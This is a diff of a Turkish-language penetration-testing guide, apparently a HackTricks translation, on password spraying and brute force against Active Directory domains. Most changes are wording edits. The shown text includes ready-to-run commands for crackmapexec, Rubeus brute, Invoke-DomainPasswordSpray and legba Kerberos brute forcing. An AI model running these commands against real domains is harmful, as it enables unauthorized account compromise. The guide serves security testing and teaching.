@@ -5,16 +5,16 @@
 
 ## **Şifre Spraying**
 
-Birçok **geçerli kullanıcı adı** bulduktan sonra, her bir keşfedilen kullanıcı ile en **yaygın şifreleri** deneyebilirsiniz (ortamın şifre politikalarını göz önünde bulundurun).\
+Birçok **geçerli kullanıcı adı** bulduktan sonra, her bir keşfedilen kullanıcı için en **yaygın şifreleri** denemeye başlayabilirsiniz (ortamın şifre politikalarını göz önünde bulundurun).\
 **Varsayılan** olarak **minimum** **şifre** **uzunluğu** **7**'dir.
 
-Yaygın kullanıcı adları listeleri de faydalı olabilir: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Yaygın kullanıcı adı listeleri de faydalı olabilir: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
 Birden fazla yanlış şifre denerseniz bazı hesapların kilitlenebileceğini unutmayın (varsayılan olarak 10'dan fazla).
 
 ### Şifre politikasını öğrenme
 
-Bazı kullanıcı kimlik bilgilerine veya bir alan kullanıcısı olarak bir shell'e sahipseniz, **şifre politikasını** **şu şekilde alabilirsiniz**:
+Eğer bazı kullanıcı kimlik bilgilerine veya bir alan kullanıcısı olarak bir shell'e sahipseniz, **şifre politikasını** **şu şekilde alabilirsiniz**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -31,7 +31,7 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Linux'ten Sömürü (veya hepsi)
+### Linux'ten (veya tümünden) Sömürü
 
 - **crackmapexec** kullanarak:
 ```bash
@@ -69,7 +69,7 @@ done
 ```
 #### Windows'tan
 
-- [Rubeus](https://github.com/Zer1t0/Rubeus) brute modülü ile versiyon:
+- [Rubeus](https://github.com/Zer1t0/Rubeus) brute modülü ile versiyonu:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -77,15 +77,15 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) ile (Varsayılan olarak alan kullanıcılarını oluşturabilir ve alanın şifre politikasını alır ve denemeleri buna göre sınırlar):
-```powershell
+- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) ile (Varsayılan olarak alan kullanıcılarını oluşturabilir ve alanın şifre politikasını alarak denemeleri buna göre sınırlayabilir):
+```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 - [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) ile
 ```
 Invoke-SprayEmptyPassword
 ```
-## Kaba Güç
+## Brute Force
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
